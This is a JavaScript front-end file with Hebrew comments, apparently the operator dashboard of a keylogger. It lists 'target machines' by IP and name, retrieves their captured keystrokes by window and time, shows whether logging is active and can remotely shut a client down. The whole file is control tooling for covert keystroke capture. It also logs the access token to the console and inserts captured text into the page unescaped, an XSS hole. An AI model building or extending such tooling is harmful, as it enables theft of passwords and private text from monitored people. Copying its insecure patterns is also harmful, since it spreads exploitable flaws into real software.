function BackToLogin() {
    window.location.href = "/login";
}

function handleTokenError(errorMsg) {
    console.error("Token error:", errorMsg);
    document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    BackToLogin();
}

async function getCookie(name) {
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    for (let [key, value] of cookies) {
        if (key === name) {
            return decodeURIComponent(value);
        }
    }
    return null;
}

async function GetDemoLogs() {
    const token = await getCookie("access_token");
    console.log(token);
    
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch("/api/get_demo", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        
        return data;
    } catch (error) {
        console.error("Error fetching demo logs:", error);
        return null;
    }
}

async function GetComputersList() {
    const token = await getCookie("access_token"); 
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch("/api/get_target_machines_list", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        return data;
    } catch (error) {
        console.error("Error fetching computers list:", error);
        return null;
    }
}

async function GetComputersActivity(machine_sn, start_date, end_date) {
    const token = await getCookie("access_token"); 
    if (!token) {
        handleTokenError("No token found");
        return;
    }
    
    try {
        let response = await fetch("/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });
        
        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        
        return data;
    } catch (error) {
        console.error("Error fetching computer activity:", error);
        return null;
    }
}

async function StopListening(machineId) {
    const token = await getCookie("access_token");
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch(`/api/shutdown_client?machine_sn=${machineId}`, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }

        if (data.status === "success") {
            let indicator = document.getElementById("indicator");
    
            indicator.classList.remove("active");
            indicator.title = "Logging is not active."
    
            fetchLogs();
        }

        return data;
    } catch (error) {
        console.error("Error stopping listener:", error);
        return null;
    }
}

// משתנים גלובליים לבקרת העדכון האוטומטי
let isPopupOpen = false;
let autoRefreshInterval = null;
let currentMachineId = null;
let currentStartDate = null;
let currentEndDate = null;

async function fetchLogs() {
    const tableBody = document.getElementById("ComputersTableBody");
    
    try {
        const data = await GetComputersList();
        
        // יצירת תוכן HTML חדש
        let newContent = "";
        
        if (!data || typeof data !== "object" || Object.keys(data).length === 0) { 
            newContent = "<tr><td colspan='4' class='text-center'>No available data</td></tr>";
        } else {
            Object.entries(data).forEach(([id, details]) => {
                newContent += `
                    <tr>
                        <td>${id}</td>
                        <td>${details.ip}</td>
                        <td>${details.name}</td>
                        <td>${details.active ? '✅' : '🟩'}</td>
                    </tr>
                `;
            });
        }
        
        // עדכון התוכן בצורה חלקה
        tableBody.innerHTML = newContent;
        
        // הוספת אירועי לחיצה מחדש
        addRowClickListeners();
        
    } catch (error) {
        console.error("Error in fetchLogs:", error);
        tableBody.innerHTML = "<tr><td colspan='4' class='text-center'>Error loading data</td></tr>";
    }
}

function formatDateToDDMMYYYY(dateStr) {
    let date = new Date(dateStr);
    let day = String(date.getDate()).padStart(2, '0');
    let month = String(date.getMonth() + 1).padStart(2, '0');
    let year = date.getFullYear();
    return `${day}-${month}-${year}`;
}

async function LoadComputerActivity(machine_sn, start_date, end_date) {
    const activityTable = document.getElementById("ActivityTable");
    
    try {
        const log = await GetComputersActivity(machine_sn, start_date, end_date);
        
        // יצירת תוכן HTML חדש
        let newContent = "";
        
        if (!log) {
            newContent = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
        } else if (log.error) {
            newContent = `<tr><td colspan='3' class='text-center'>${log.error}</td></tr>`;
        } else if (typeof log !== "object" || Object.keys(log).length === 0 || !log.logs) {
            newContent = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
        } else {
            Object.entries(log.logs).forEach(([window, val]) => {
                Object.entries(val).forEach(([time, text]) => {
                    newContent += `<tr><td>${time}</td><td>${window}</td><td>${text}</td></tr>`;
                });
            });  
        }
        
        // עדכון התוכן בצורה חלקה
        activityTable.innerHTML = newContent;
        
    } catch (error) {
        console.error("Error in LoadComputerActivity:", error);
        activityTable.innerHTML = "<tr><td colspan='3' class='text-center'>Error loading data</td></tr>";
    }
}

// פונקציה חדשה לעדכון מצב המחשב
async function updateMachineStatus() {
    if (!currentMachineId) return;
    
    try {
        const data = await GetComputersList();
        if (!data || !data[currentMachineId]) return;
        
        const machineDetails = data[currentMachineId];
        const wasActive = document.getElementById("indicator").classList.contains("active");
        
        // עדכון אינדיקטור הפעילות
        let indicator = document.getElementById("indicator");
        if (machineDetails.active) {
            indicator.classList.add("active");
            indicator.title = "Logging is active.";
        } else {
            indicator.classList.remove("active");
            indicator.title = "Logging is not active.";
        }
        
        // הסתרה או הצגה של כפתור העצירה בהתאם למצב הפעילות
        const stopButton = document.getElementById("stopListening");
        if (machineDetails.active) {
            stopButton.style.display = "block";
        } else {
            stopButton.style.display = "none";
        }
        
        // עדכון פעילות המחשב הנוכחי רק אם המחשב פעיל ויש תאריכים מוגדרים
        if (machineDetails.active && currentStartDate && currentEndDate) {
            // אם המחשב פעיל, נעדכן את נתוני ההקשות
            LoadComputerActivity(currentMachineId, currentStartDate, currentEndDate);
        }
    } catch (error) {
        console.error("Error updating machine status:", error);
    }
}

const popup = document.getElementById("ComputerActivity");
const overlay = document.getElementById("overlay");
const closePopupBtn = document.getElementById("closePopup");

function closePopup() {
    popup.style.display = "none";
    overlay.style.display = "none";
    isPopupOpen = false;
    currentMachineId = null;
    currentStartDate = null;
    currentEndDate = null;

    // איפוס והחלפת כפתור העצירה
    const stopListeningButton = document.getElementById("stopListening");
    if (stopListeningButton) {
        stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));
    }
    
    // הפעלה מחדש של עדכון רשימת המחשבים
    setupAutoRefresh();
}

async function openPopup(machineId, ip, name, active) {
    document.getElementById("compId").textContent = machineId;
    document.getElementById("compIp").textContent = ip;
    document.getElementById("compName").textContent = name;

    // שמירת זיהוי המחשב הנוכחי לעדכונים
    currentMachineId = machineId;
    isPopupOpen = true;

    let indicator = document.getElementById("indicator");
    if (active === '✅') {
        indicator.classList.add("active");
        indicator.title = "Logging is active.";
        
        // הצג את כפתור העצירה
        document.getElementById("stopListening").style.display = "block";
    } else {
        indicator.classList.remove("active");
        indicator.title = "Logging is not active.";
        
        // הסתר את כפתור העצירה
        document.getElementById("stopListening").style.display = "none";
    }

    popup.style.display = "block";
    overlay.style.display = "block";

    let today = new Date().toISOString().split('T')[0];
    document.getElementById("startDate").value = today;
    document.getElementById("endDate").value = today;

    // שמירת התאריכים הנוכחיים לעדכונים
    currentStartDate = formatDateToDDMMYYYY(today);
    currentEndDate = formatDateToDDMMYYYY(today);

    LoadComputerActivity(machineId, formatDateToDDMMYYYY(today), formatDateToDDMMYYYY(today));

    const stopListeningButton = document.getElementById("stopListening");
    stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));

    document.getElementById("stopListening").addEventListener("click", function() {
        const currentMachineId = document.getElementById("compId").textContent;
        StopListening(currentMachineId);
    });
    
    // עדכון מערכת העדכון האוטומטי
    setupAutoRefresh();
}

// פונקציה להגדרת העדכון האוטומטי בהתאם למצב הממשק
function setupAutoRefresh() {
    // ניקוי הטיימר הקיים
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
    }
    
    // הגדרת הטיימר החדש בהתאם למצב
    if (isPopupOpen) {
        // אם יש פופאפ פתוח, עדכן את מצב המחשב ואת הנתונים שלו
        autoRefreshInterval = setInterval(() => {
            updateMachineStatus();
        }, 5000); // עדכון כל 5 שניות
    } else {
        // אם אין פופאפ פתוח, עדכן את רשימת המחשבים
        autoRefreshInterval = setInterval(() => {
            fetchLogs();
        }, 5000); // עדכון כל 5 שניות
    }
}

// פונקציה חדשה להוספת מאזיני לחיצה לשורות הטבלה
function addRowClickListeners() {
    const rows = document.querySelectorAll("#ComputersTableBody tr");
    rows.forEach(row => {
        row.addEventListener("click", function() {
            let rowData = Array.from(this.children).map(td => td.textContent.trim());
            openPopup(rowData[0], rowData[1], rowData[2], rowData[3]);
        });
    });
}

document.addEventListener("DOMContentLoaded", function() {
    fetchLogs();
    
    closePopupBtn.addEventListener("click", closePopup);
    overlay.addEventListener("click", closePopup);
    
    document.addEventListener("keydown", function(event) {
        if (event.key === "Escape") {
            closePopup();
        }
    });
    
    document.getElementById("logout").addEventListener("click", async function() {
        document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        BackToLogin();
    });
    
    // החלפת האזנה ישירה באזנה דלגציה (event delegation)
    document.getElementById("ComputersTable").addEventListener("click", function(event) {
        let row = event.target.closest("tr");
        if (!row) return;

        let rowData = Array.from(row.children).map(td => td.textContent.trim());
        openPopup(rowData[0], rowData[1], rowData[2], rowData[3]);
    });
    
    document.getElementById("updateActivity").addEventListener("click", function() {
        let machineId = document.getElementById("compId").textContent;
        let startDate = document.getElementById("startDate").value;
        let endDate = document.getElementById("endDate").value;
        
        // עדכון התאריכים הנוכחיים לעדכונים
        currentStartDate = formatDateToDDMMYYYY(startDate);
        currentEndDate = formatDateToDDMMYYYY(endDate);

        LoadComputerActivity(machineId, formatDateToDDMMYYYY(startDate), formatDateToDDMMYYYY(endDate));
    });
    
    // הפעלת מערכת העדכון האוטומטי בטעינת הדף
    setupAutoRefresh();
});